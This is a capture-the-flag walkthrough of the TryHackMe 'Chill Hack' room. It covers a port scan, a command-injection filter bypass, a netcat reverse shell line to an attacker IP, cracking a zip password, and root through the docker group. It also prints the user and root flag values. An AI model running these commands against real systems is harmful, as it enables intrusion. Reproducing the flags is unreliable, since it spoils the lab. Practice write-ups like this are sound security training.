Room: https://tryhackme.com/room/chillhack
##

**sudo nmap** -sS -sV -T5 -vv xx.xx.xx.xxx
```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
FTP service allows us to connect Anonymously.  
However, there's no useful information that gives us two possible usernames.  

**gobuster** dir -u http://xx.xx.xx.xxx --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100
```
/images               (Status: 301) [Size: 313] [--> http://xx.xx.xx.xxx/images/]
/css                  (Status: 301) [Size: 310] [--> http://xx.xx.xx.xxx/css/]   
/js                   (Status: 301) [Size: 309] [--> http://xx.xx.xx.xxx/js/]    
/fonts                (Status: 301) [Size: 312] [--> http://xx.xx.xx.xxx/fonts/] 
/secret               (Status: 301) [Size: 313] [--> http://xx.xx.xx.xxx/secret/]
```

Navigating to **/secret** directory of the page, we find out that the input is filtered.  
We can easily bypass that by using **echo $(cmd)** to run commands.  

We can use this to create a reverse shell to our attacking machine.  
**echo** $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc xx.x.x.xxx 8888 >/tmp/f)

By navigating to **/var/www/files** we can find two php files.  
Inside the **hacker.php** we find some hints.
```
	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
	<h1 style="background-color:red;">You have reached this far. </h2>
	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
```

At some point, that image should appear along with the text above.  
This makes me think it has something to do with the image shown.  

We can find the photo at **/var/www/files/images/**.  
I started a python http server and downloaded the archive to my attacking machine.  

**zip2john** backup.zip > hash
**john** hash --wordlist=/usr/share/wordlists/rockyou.txt => pass1word  

Extracting the zip, we are given a **source_code.php** file.  
```
<html>
<head>
	Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
			Email: <input type="email" name="email" placeholder="email"><br><br>
			Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
		</form>
<?php
        if(isset($_POST['submit']))
	{
		$email = $_POST["email"];
		$password = $_POST["password"];
		if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
		{ 
			$random = rand(1000,9999);?><br><br><br>
			<form method="POST">
				Enter the OTP: <input type="number" name="otp">
				<input type="submit" name="submitOtp" value="Submit">
			</form>
		<?php	mail($email,"OTP for authentication",$random);
			if(isset($_POST["submitOtp"]))
				{
					$otp = $_POST["otp"];
					if($otp == $random)
					{
						echo "Welcome Anurodh!";
						header("Location: authenticated.php");
					}
					else
					{
						echo "Invalid OTP";
					}
				}
 		}
		else
		{
			echo "Invalid Username or Password";
		}
        }
?>
</html>
```

We can see that is the source code of a poorly coded login portal.  
It gives us the user **Anurodh** and the password **!d0ntKn0wmYp@ssw0rd**.  

**su anurodh**, using the password found earlier.  
This allows us to change the user from **www-data** to **anurodh** on the target machine.  

**anurodh@ubuntu:/home$** id
```
uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
```

Giving the fact that we're in the docker group, the machine is already rooted.  
On the [GTFObins](https://gtfobins.github.io/gtfobins/docker/#sudo) we can find the required command(s) to escalate privileges.   

> docker run -v /:/mnt --rm -it alpine chroot /mnt sh

After some seconds, we're under the root account.

**First flag is at /home/apaar/ and is {USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}** **[1]**.   
**Second and final flag is at /root/proof.txt and is {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}** **[2]**.  
